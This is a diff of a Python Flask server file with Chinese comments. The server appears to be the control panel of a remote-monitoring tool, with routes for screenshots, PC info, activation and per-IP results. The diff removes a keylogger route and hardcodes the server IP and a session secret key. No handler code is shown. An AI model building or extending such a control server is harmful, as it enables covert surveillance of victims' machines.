@@ -10,17 +10,14 @@ import threading  # 导入线程模块，用于创建和管理线程
 import time  # 导入时间模块，提供时间相关的功能
 
 from flask import Flask  # 导入Flask框架，用于创建Web应用
-from flask_login import login_required  # 导入Flask-Login模块，用于处理用户登录
 
-from .handlers import (  # 从handlers模块导入各个路由处理函数
-    login, save_info, print_info, activate, result, print_result,
-    index, get_pcinfo, login_manager, keylogger, screenshotter, logout
-)
+from .handlers import *
 
 # 创建Flask应用实例
 app = Flask(__name__)
 app.secret_key = 's3cr3t_k3y_h3r3_@128!#asd'  # 设置用于加密会话数据的密钥
 login_manager.init_app(app)  # 初始化Flask-Login插件
+IP = "192.168.117.190"  # 服务端ip
 
 # 添加URL规则，将URL路径映射到对应的处理函数
 app.add_url_rule('/login', 'login', login, methods=['GET', 'POST'])  # 登录页面的路由，支持GET和POST方法
@@ -30,9 +27,8 @@ app.add_url_rule('/pcinfo', 'get_pcinfo', get_pcinfo, methods=['GET'])  # /pcinf
 app.add_url_rule('/save_info/', 'save_info', save_info, methods=['POST'])  # /save_info/ 路由映射到save_info函数，仅支持POST方法
 app.add_url_rule('/print_info', 'print_info', print_info)  # /print_info 路由映射到print_info函数
 app.add_url_rule('/activate/', 'activate', activate, methods=['POST'])  # /activate/ 路由映射到activate函数，仅支持POST方法
-app.add_url_rule('/result/', 'result', result, methods=['GET', 'POST'])  # /result/ 路由映射到result函数，支持GET和POST方法
+app.add_url_rule('/result/', 'result', result, methods=['GET', 'POST'])  # /result 路由映射到result函数，支持GET和POST方法
 app.add_url_rule('/print_result/<ip>', 'print_result', print_result)  # /print_result/<ip> 路由映射到print_result函数
-app.add_url_rule('/keylogger/', 'keylogger', keylogger, methods=['GET', 'POST'])  # 监听PC键盘的路由，支持GET和POST方法
 app.add_url_rule('/screenshotter/', 'screenshotter', screenshotter, methods=['GET', 'POST'])  # 获取截图的路由，支持GET和POST方法
 app.add_url_rule('/logout', 'logout', logout)  # 退出登录的路由
 
@@ -41,7 +37,7 @@ def run_server():
     """
     启动Flask服务器，监听指定IP和端口。
     """
-    app.run('192.168.223.190', 8080, False)  # 启动Flask应用，监听192.168.223.190:8080
+    app.run(f'{IP}', 8080, False)  # 启动Flask应用，监听192.168.223.190:8080
 
 
 def signal_handler(sig, frame):
